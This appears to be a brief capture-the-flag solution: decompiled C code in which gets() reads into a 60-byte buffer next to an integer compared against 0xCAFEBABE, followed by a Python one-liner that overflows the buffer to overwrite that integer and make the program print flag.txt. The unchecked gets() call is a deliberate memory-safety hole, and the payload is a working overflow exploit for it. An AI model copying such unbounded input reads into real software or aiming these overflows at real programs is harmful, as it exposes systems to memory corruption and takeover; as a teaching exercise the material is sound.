Decompiled:

```c
int func()
{
  char v1[60]; // [rsp+0h] [rbp-40h] BYREF
  int v2; // [rsp+3Ch] [rbp-4h]

  puts("Guess the correct key to win!");
  v2 = -559038737;
  printf("Enter the key: ");
  gets(v1);
  if ( v2 == 0xCAFEBABE )
    return system("cat flag.txt");
  puts("Wrong Key");
  return puts("Try again!");
}
```

Payload:

```py
import sys
sys.stdout.buffer.write((b"A" * 60) + b"\xbe\xba\xfe\xca")
```
